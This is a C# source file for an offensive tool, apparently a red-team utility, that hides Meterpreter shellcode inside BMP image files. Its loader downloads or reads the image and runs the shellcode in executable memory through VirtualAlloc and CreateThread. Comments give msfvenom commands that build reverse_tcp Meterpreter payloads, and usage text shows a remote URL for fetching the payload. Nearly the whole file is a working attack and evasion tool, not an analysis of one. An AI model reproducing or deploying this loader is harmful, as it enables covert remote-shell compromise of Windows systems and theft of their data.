using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;

namespace NativePayload_Image
{
    class Program
    {
        /// .Net Framework 2.0 , 3.5 and 4.0 only supported
        /// .Net Framework 4.5 and 4.6 Not Supported ;O
        
        /// Windows 2008 R2 tested with BMP Format only .
        /// Note : tested and worked by MS Paint for Viewing bmp files only.
        
        /// in kali linux you can use "hexeditor" command and in windows you can use "Hex editor NEO".
        /// for meterpreter payload
        /// msfvenom --platfoem windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 -f c > payload.txt
        /// msfvenom --platfoem windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 -f num > payload.txt

        /// <summary>
        ///  this Default_Header_BMP ws for one BMP file with (604 * 2 pixels)
        /// </summary>
        public static string Default_Header_BMP = "42;4d;5e;0e;00;00;00;00;00;00;36;00;00;00;28;00;00;00;5c;02;00;00;02;00;00;00;01;00;18;00;00;00;00;00;28;0e;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00;00";
        /// <summary>
        /// Ex_Payload_BMP_Length hardcoded ;)
        /// </summary>
        public static int Ex_Payload_BMP_Length = 3114;
        public static string Ex_Payload_BMP_byte = "ff";
       
        public static string InjectPayload_to_BMP(string X_Meterpreter ,string Header, Int32 Ex_Payload_Length , bool Is_New_or_Exist_File , string FileName)
        {
            try
            {
                if (Is_New_or_Exist_File)
                {

                    /// true is New File so should make New BMP file

                    byte[] _BMP = new byte[Header.Length + X_Meterpreter.Length + Ex_Payload_Length];

                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("[!] Making New Bitmap File ...");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[!] Bitmap File Name : {0}", FileName);
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("[+] Creating Header for Bitmap File ...");
                    string[] _bmp_h = Header.Split(';');
                    Console.ForegroundColor = ConsoleColor.Green;
                    for (int i = 0; i < _bmp_h.Length; i++)
                    {
                        if (i == 0)
                        {
                            Console.Write("[>] Header adding (length {0}) : ", _bmp_h.Length.ToString());
                        }
                        if (i <= 16)
                        {
                            Console.Write(_bmp_h[i].ToString());
                        }
                        _BMP[i] = Convert.ToByte(_bmp_h[i], 16);
                    }
                    Console.Write("........");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("[+] Injecting Meterpreter Payload to Bitmap File ...");
                    Console.ForegroundColor = ConsoleColor.Green;
                    string[] _bmp_x = X_Meterpreter.Split(',');
                    for (int j = 0; j < _bmp_x.Length; j++)
                    {
                        if (j == 0)
                        {
                            Console.Write("[>] Injecting Payload (length {0}) : ", _bmp_x.Length.ToString());
                        }
                        if (j <= 16)
                        {
                            Console.Write(_bmp_x[j]);
                        }

                        _BMP[j + _bmp_h.Length] = Convert.ToByte(_bmp_x[j], 16);
                    }
                    Console.Write("........");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine("[+] Adding Ex-Payload for Bitmap File ...");
                    Console.ForegroundColor = ConsoleColor.Green;
                    for (int k = 0; k < Ex_Payload_Length; k++)
                    {
                        if (k == 0)
                        {
                            Console.Write("[>] Ex-Payload adding (length FF * {0}).", Ex_Payload_Length.ToString());
                        }
                        _BMP[k + _bmp_h.Length + _bmp_x.Length] = Convert.ToByte("ff", 16);
                    }

                    /// time to create bmp file
                    File.WriteAllBytes(FileName, _BMP);
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine();
                    Console.WriteLine("[!] File {0} with length {1} bytes Created.", FileName, _BMP.Length.ToString());


                }
                Console.ForegroundColor = ConsoleColor.Gray;
            }
            catch (Exception)
            {

                throw;
            }
            return "";
        }
        public static string InjectPayload_to_BMP(string X_Meterpreter, Int32 StartAddress, bool Is_New_or_Exist_File, string FileName)
        {
            try
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine("[!] Modify Bitmap File ...");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] Bitmap File Name : {0}", FileName);
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine("[+] Injecting Meterpreter Paylaod to Bitmap File ...");
                Console.ForegroundColor = ConsoleColor.Green;
                if (!Is_New_or_Exist_File)
                {
                    /// false is exist File so should insert payload to BMP file (it is overwritten)
                    byte[] xPayload_Temp = File.ReadAllBytes(FileName);
                    string[] _bmp_x = X_Meterpreter.Split(',');
                    for (int i = 0; i < _bmp_x.Length;)
                    {
                        xPayload_Temp[i + StartAddress] = Convert.ToByte(_bmp_x[i], 16);


                        if (i == 0)
                        {
                            Console.Write("[>] Injecting Payload (length {0}) : ", _bmp_x.Length.ToString());
                        }
                        if (i <= 16)
                        {
                            Console.Write(_bmp_x[i]);
                        }
                        i++;
                    }
                    File.WriteAllBytes(FileName, xPayload_Temp);
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine();
                    Console.WriteLine("[!] File {0} with length {1} bytes Modified.", FileName, xPayload_Temp.Length.ToString());

                }
                Console.ForegroundColor = ConsoleColor.Gray;
            }
            catch (Exception)
            {

                throw;
            }
            return "";

        }

            static void Main(string[] args)
        {

            if (args.Length < 1)
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Detecting/Injecting Meterpreter Payload bytes from BMP Image Files");                                                
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Injecting Syntax :");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("Syntax Creating New Bitmap File by template:");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Syntax  I: NativePayload_Image.exe create [NewFileName.bmp] [Meterpreter_payload] ");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("Example I: NativePayload_Image.exe create test.bmp fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("Syntax Modify Bitmap File by New Payload:");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Syntax  II: NativePayload_Image.exe modify [ExistFileName.bmp] [header_length] [Meterpreter_payload]  ");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("Example II: NativePayload_Image.exe modify test.bmp  54  fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Detecting and Getting Meterpreter Session (backdoor mode) Syntax :");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("Syntax Getting Meterpreter Session by local BMP File:");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine();
                Console.WriteLine("Syntax  I: NativePayload_Image.exe bitmap [ExistFileName.bmp] [Payload_length] [BMP_Header_Length] ");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("Example I: NativePayload_Image.exe bitmap test.bmp 510 54");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("Syntax Getting Meterpreter Session with Url by http Traffic");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine();
                Console.WriteLine("Syntax  II: NativePayload_Image.exe url [target url] [Payload_length] [BMP_Header_Length] ");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine(@"Example II: NativePayload_Image.exe url http://192.168.1.2/images/test.bmp 510 54");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("Syntax Getting Meterpreter Session by local/Web Encrypted BMP File:");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Syntax  III: NativePayload_Image.exe decrypt [target url or local filename] [Payload_length] [BMP_Header_Length] ");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine(@"Example III: NativePayload_Image.exe decrypt http://192.168.1.2/images/test.bmp 510 54");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
            }
            else
            {
                if (args[0].ToUpper() == "CREATE")
                {
                    /// Example I: NativePayload_Image.exe create test.bmp fc4883e4f0e8cc00000041514150
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Detecting/Injecting Meterpreter Payload bytes from BMP Image Files");
                    Console.WriteLine();

                    String S1 = args[1];
                    String S2 = args[2];
                    
                    InjectPayload_to_BMP(S2, Default_Header_BMP, Ex_Payload_BMP_Length, true, S1);
                }
                if (args[0].ToUpper() == "MODIFY")
                {
                    /// Example II: NativePayload_Image.exe modify test.bmp  54  fc4883e4f0e8cc00000041514150
                    /// InjectPayload_to_BMP(pay, 54, 510, false, "demo1.bmp");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Detecting/Injecting Meterpreter Payload bytes from BMP Image Files");
                    Console.WriteLine();

                    InjectPayload_to_BMP(args[3], Convert.ToInt32(args[2]), false, args[1]);
                }
                if (args[0].ToUpper() == "BITMAP")
                {
                    try
                    {
                        ///"Example I: NativePayload_Image.exe bitmap test.bmp 510 54"
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        Console.WriteLine("NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Detecting/Injecting Meterpreter Payload bytes from BMP Image Files");
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine("[+] Detecting Meterpreter Payload bytes by Image Files");
                        Console.ForegroundColor = ConsoleColor.DarkCyan;
                        Console.WriteLine("[+] File Scanning .. . . ");

                        string filename = args[1];

                        byte[] xPayload = File.ReadAllBytes(filename);
                        Console.ForegroundColor = ConsoleColor.DarkYellow;
                        Console.WriteLine("[+] Reading Payloads from \"{0}\" file ", filename);
                        Console.WriteLine("[+] Scanning Payload with length {0} from byte {1}", args[2], args[3]);



                        int offset = Convert.ToInt32(args[3]);
                        int counter = 0;
                        int Final_Payload_Length = Convert.ToInt32(args[2]);
                        byte[] Final = new byte[Convert.ToInt32(args[2])];

                        for (int i = 0; i <= xPayload.Length; i++)
                        {
                            if (i >= offset)
                            {
                                if (counter == Final_Payload_Length) break;

                                Final[counter] = xPayload[i];
                                counter++;
                            }
                        }

                        UInt32 MEM_COMMIT = 0x1000;
                        UInt32 PAGE_EXECUTE_READWRITE = 0x40;

                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Bingo Meterpreter session by BMP images ;)");

                        UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        Marshal.Copy(Final, 0x00000000, (IntPtr)(funcAddr), Final.Length);

                        IntPtr hThread = IntPtr.Zero;
                        UInt32 threadId = 1;
                        IntPtr pinfo = IntPtr.Zero;

                        hThread = CreateThread(0x0000, 0x7700, funcAddr, pinfo, 0x303, ref threadId);
                        WaitForSingleObject(hThread, 0xfffff1fc);
                        Console.ForegroundColor = ConsoleColor.Gray;
                    }
                    catch (Exception)
                    {

                        throw;
                    }
                }
                if (args[0].ToUpper() == "URL")
                {
                    try
                    {
                        ///"Example I: NativePayload_Image.exe url http://192.168.1.2/test.bmp 510 54"
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        Console.WriteLine("NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Detecting/Injecting Meterpreter Payload bytes from BMP Image Files");
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine("[+] Detecting Meterpreter Payload bytes by Image Files");
                        Console.ForegroundColor = ConsoleColor.DarkCyan;
                        Console.WriteLine("[+] File Scanning .. . . ");

                        System.Net.WebClient web = new System.Net.WebClient();                        
                        byte[] xPayload = web.DownloadData(args[1].ToString());
                                                                                             
                        Console.ForegroundColor = ConsoleColor.DarkYellow;
                        Console.WriteLine("[+] Reading Payloads from URL  \"{0}\"  ",args[1]);
                        Console.WriteLine("[+] Scanning Payload with length {0} from byte {1}", args[2], args[3]);



                        int offset = Convert.ToInt32(args[3]);
                        int counter = 0;
                        int Final_Payload_Length = Convert.ToInt32(args[2]);
                        byte[] Final = new byte[Convert.ToInt32(args[2])];

                        for (int i = 0; i <= xPayload.Length; i++)
                        {
                            if (i >= offset)
                            {
                                if (counter == Final_Payload_Length) break;

                                Final[counter] = xPayload[i];
                                counter++;
                            }
                        }
                        UInt32 MEM_COMMIT = 0x1000;
                        UInt32 PAGE_EXECUTE_READWRITE = 0x40;

                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Bingo Meterpreter session by BMP images ;)");

                        UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        Marshal.Copy(Final, 0x00000000, (IntPtr)(funcAddr), Final.Length);

                        IntPtr hThread = IntPtr.Zero;
                        UInt32 threadId = 1;
                        IntPtr pinfo = IntPtr.Zero;

                        hThread = CreateThread(0x0000, 0x7700, funcAddr, pinfo, 0x303, ref threadId);
                        WaitForSingleObject(hThread, 0xfffff1fc);
                        Console.ForegroundColor = ConsoleColor.Gray;
                    }
                    catch (Exception)
                    {

                        throw;
                    }
                }
                if (args[0].ToUpper() == "DECRYPT")
                {
                    /// not ready ;)
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("NativePayload_Image Tool , Published by Damon Mohammadbagher , April 2017");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Detecting/Injecting Meterpreter Payload bytes from BMP Image Files");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Encryption Method is not Ready for this version ;)");
                    Console.ForegroundColor = ConsoleColor.Gray;
                }

            }
        }
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
